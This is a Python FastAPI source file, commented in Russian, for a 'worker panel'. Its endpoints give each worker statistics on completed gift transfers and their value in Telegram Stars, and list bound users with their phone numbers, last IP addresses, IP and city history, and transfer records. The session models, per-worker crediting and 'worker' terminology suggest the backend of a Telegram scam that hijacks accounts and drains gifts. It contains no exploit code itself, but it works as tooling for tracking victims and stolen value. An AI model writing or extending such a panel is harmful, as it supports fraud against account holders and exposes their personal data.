"""
API для Worker Panel
"""
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, and_
from datetime import datetime, timedelta
import os

from app.database import get_db
from app.services import AuthService
from app.models.user import User
from app.models.worker import Worker, UserWorkerBinding
from app.models.telegram_session import GiftTransfer, IPHistory
from app.utils.logger import ActivityLogger

router = APIRouter(prefix="/api/worker-panel", tags=["worker-panel"])
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


async def get_current_worker(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Проверяет, что пользователь является воркером"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    stmt = select(Worker).where(Worker.telegram_id == str(user_id), Worker.is_active == True)
    result = await db.execute(stmt)
    worker = result.scalars().first()
    
    if not worker:
        raise HTTPException(status_code=403, detail="Not a worker")
    
    return worker


@router.get("/stats")
async def get_worker_stats(
    period: str = Query("day", regex="^(day|week|month)$"),
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить статистику воркера за период"""
    
    worker = await get_current_worker(token, db)
    
    # Определяем период
    now = datetime.utcnow()
    if period == "day":
        start_date = now - timedelta(days=1)
    elif period == "week":
        start_date = now - timedelta(weeks=1)
    else:  # month
        start_date = now - timedelta(days=30)
    
    # Количество переданных подарков
    stmt = select(func.count(GiftTransfer.id)).where(
        and_(
            GiftTransfer.worker_id == worker.id,
            GiftTransfer.created_at >= start_date,
            GiftTransfer.status == "completed"
        )
    )
    result = await db.execute(stmt)
    gifts_transferred = result.scalar() or 0
    
    # Общая стоимость в звездах
    stmt = select(func.sum(GiftTransfer.gift_value_stars)).where(
        and_(
            GiftTransfer.worker_id == worker.id,
            GiftTransfer.created_at >= start_date,
            GiftTransfer.status == "completed"
        )
    )
    result = await db.execute(stmt)
    total_stars = result.scalar() or 0
    
    # Количество активных пользователей
    stmt = select(func.count(UserWorkerBinding.id)).where(
        and_(
            UserWorkerBinding.worker_id == worker.id,
            UserWorkerBinding.is_active == True
        )
    )
    result = await db.execute(stmt)
    active_users = result.scalar() or 0
    
    # Новые пользователи за период
    stmt = select(func.count(UserWorkerBinding.id)).where(
        and_(
            UserWorkerBinding.worker_id == worker.id,
            UserWorkerBinding.bound_at >= start_date
        )
    )
    result = await db.execute(stmt)
    new_users = result.scalar() or 0
    
    return JSONResponse({
        "status": "success",
        "period": period,
        "stats": {
            "gifts_transferred": gifts_transferred,
            "total_stars_value": total_stars,
            "active_users": active_users,
            "new_users": new_users
        }
    })


@router.get("/users")
async def get_worker_users(
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=100),
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить список привязанных пользователей"""
    
    worker = await get_current_worker(token, db)
    
    # Получаем привязки
    stmt = select(UserWorkerBinding).where(
        UserWorkerBinding.worker_id == worker.id,
        UserWorkerBinding.is_active == True
    ).offset(skip).limit(limit)
    result = await db.execute(stmt)
    bindings = result.scalars().all()
    
    users_data = []
    for binding in bindings:
        # Получаем данные пользователя
        stmt = select(User).where(User.telegram_id == binding.user_telegram_id)
        result = await db.execute(stmt)
        user = result.scalars().first()
        
        if user:
            # Получаем последний IP
            stmt = select(IPHistory).where(
                IPHistory.user_telegram_id == user.telegram_id
            ).order_by(IPHistory.accessed_at.desc()).limit(1)
            result = await db.execute(stmt)
            last_ip = result.scalars().first()
            
            users_data.append({
                "telegram_id": user.telegram_id,
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "phone_number": user.phone_number,
                "last_ip": last_ip.ip_address if last_ip else None,
                "last_activity": user.last_activity.isoformat() if user.last_activity else None,
                "bound_at": binding.bound_at.isoformat(),
                "is_online": user.is_online
            })
    
    return JSONResponse({
        "status": "success",
        "users": users_data,
        "total": len(users_data)
    })


@router.get("/users/{user_id}/history")
async def get_user_history(
    user_id: str,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить историю операций пользователя"""
    
    worker = await get_current_worker(token, db)
    
    # Проверяем, что пользователь привязан к этому воркеру
    stmt = select(UserWorkerBinding).where(
        and_(
            UserWorkerBinding.user_telegram_id == user_id,
            UserWorkerBinding.worker_id == worker.id,
            UserWorkerBinding.is_active == True
        )
    )
    result = await db.execute(stmt)
    binding = result.scalars().first()
    
    if not binding:
        raise HTTPException(status_code=404, detail="User not found or not bound to this worker")
    
    # История передачи подарков
    stmt = select(GiftTransfer).where(
        GiftTransfer.from_user_id == user_id
    ).order_by(GiftTransfer.created_at.desc()).limit(50)
    result = await db.execute(stmt)
    transfers = result.scalars().all()
    
    # История IP
    stmt = select(IPHistory).where(
        IPHistory.user_telegram_id == user_id
    ).order_by(IPHistory.accessed_at.desc()).limit(20)
    result = await db.execute(stmt)
    ip_history = result.scalars().all()
    
    return JSONResponse({
        "status": "success",
        "user_id": user_id,
        "transfers": [
            {
                "id": t.id,
                "gift_id": t.gift_id,
                "gift_name": t.gift_name,
                "gift_link": t.gift_link,
                "gift_value_stars": t.gift_value_stars,
                "operation_type": t.operation_type,
                "status": t.status,
                "created_at": t.created_at.isoformat(),
                "completed_at": t.completed_at.isoformat() if t.completed_at else None
            }
            for t in transfers
        ],
        "ip_history": [
            {
                "ip_address": ip.ip_address,
                "country": ip.country,
                "city": ip.city,
                "accessed_at": ip.accessed_at.isoformat()
            }
            for ip in ip_history
        ]
    })
